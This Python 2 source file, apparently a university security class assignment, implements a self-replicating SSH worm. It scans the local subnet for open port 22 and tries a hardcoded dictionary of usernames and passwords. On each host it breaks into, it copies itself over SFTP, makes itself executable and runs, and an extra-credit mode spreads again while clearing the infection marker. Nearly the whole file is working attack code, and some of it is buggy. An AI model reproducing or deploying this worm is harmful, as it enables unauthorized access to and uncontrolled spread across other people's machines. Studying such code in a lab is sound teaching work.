import paramiko
import sys
import netinfo
import socket
import nmap
import os

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The fileing whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
    # Check if the system as infected. One
    # approach is to check for a file called
    # infected.txt in directory /tmp (which
    # you created when you marked the system
    # as infected).
    is_infected = os.path.isfile("/tmp/infected.txt")
    return is_infected


#################################################################
# Marks the system as infected
#################################################################
def markInfected():
    # Mark the system as infected. One way to do
    # this is to create a file called infected.txt
    # in directory /tmp/
    infected_file = open("/tmp/infected.txt", "w+")
    infected_file.close()


###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	# This function takes as a parameter
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py", "/tmp/worm.py")
	sftpClient.close()
	sshClient.exec_command("chmod a+rwx /tmp/worm.py")
	sshClient.exec_command("python /tmp/worm.py")


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	print userName + "," + password + "," + host
	try:
		connection_result = sshClient.connect(host, username = userName, password = password)
		print "good connection" 
		return 0
	except:
		print "error connection"
		return 1
	pass


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system.
		attemptResults = tryCredentials(host, username, password, ssh)
		if attemptResults == 0:
			return [ssh, username, password]
	# Could not find working credentials
	return None	


####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	my_ip = netinfo.get_ip(interface)
	return my_ip


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.
	interface_list = netinfo.list_devs()
	portScanner = nmap.PortScanner()
	interface = ""
	for i in interface_list:
		if i == "enp0s3":
			interface = i 
	portScanner.scan(getMyIP(interface) + "/24",  arguments='-p 22 --open')
	hostInfo = portScanner.all_hosts()
	return hostInfo


def removeSelfFromIpList(networkHosts):
	for host in networkHosts:
		if host == myIp:
			networkHosts.remove(host)


def sftpGetOrThrowException(sshClient):
	remotePath = '/tmp/infected.txt'
	localPath = '/home/infectCheck.txt'
	sftpClient = sshClient.open_sftp()
	sftpClient.get(remotePath, localPath)

#!!!!!!!!!!!!!!extra credit!!!!!!!!!!!!!!!!!!!!!!!!!!!
def spreadAndRemove():
	print 'Running in remove mode'
	networkHosts = getHostsOnTheSameNetwork()
	print 'found hosts: '
	print networkHosts
	myIp = getMyIP("enp0s3")
	if networkHosts is not None:
		removeSelfFromIpList(networkHosts)
		for host in networkHosts:
			sshInfo = attackSystem(host)
			print sshInfo
			if sshInfo:
				print 'trying to spread'
				try:
					sftpClient = sshInfo[0].open_sftp()
					sftpGetOrThrowException(sshInfo[0])
					sftpClient.put("worm.py", "/tmp/worm.py")
					sshClient.exec_command("chmod a+rwx /tmp/worm.py")
					sshClient.exec_command("rm /tmp/infected.txt")
					sshClient.exec_command("python /tmp/worm.py r")
					sshClient.exec_command("rm /tmp/worm.py")
					sftpClient.close()
				except Exception as e:
					print e	
					print 'System not infected'
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.
origin_mode = False
if len(sys.argv) > 1:
		if sys.argv[1] is 'o':
			print "Running on origin system"
			origin_mode is True
		elif sys.argv[1] is 'r':
			spreadAndRemove()
			exit()
		else:
			print sys.argv[1] + ' is not a valid flag'
			exit()
else:
	
		# TODO: If we are running on the victim, check if 
		# the victim was already infected. If so, terminate.
		# Otherwise, proceed with malice.
	if isInfectedSystem():
		print "System already infected"		
		exit()
if not origin_mode:
	markInfected()

# TODO: Get the IP of the current system	
myIp = getMyIP("enp0s3")

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).

if networkHosts is not None:
	removeSelfFromIpList(networkHosts)
	print "Found hosts: ", networkHosts

	# Go through the network hosts
	for host in networkHosts:

		# Try to attack this host
		sshInfo = attackSystem(host)
		print sshInfo

		# Did the attack succeed?
		if sshInfo:
			print "Trying to spread"
			# TODO: Check if the system was
			# already infected. This can be
			# done by checking whether the
			# remote system contains /tmp/infected.txt
			# file (which the worm will place there
			# when it first infects the system)
			# This can be done using code similar to
			# the code below:
			try:
				# Copy the file from the specified
				# remote path to the specified
				# local path. If the file does exist
				# at the remote path, then get()
				# will throw IOError exception
				# (that is, we know the system is
				# not yet infected).
				sftpGetOrThrowException(sshInfo[0])
			except IOError:
				print "This system should be infected"
				spreadAndExecute(sshInfo[0])
				sshInfo[0].close()
				print "System infected"
			#
			#
			# If the system was already infected proceed.
			# Otherwise, infect the system and terminate.
			# Infect that system	
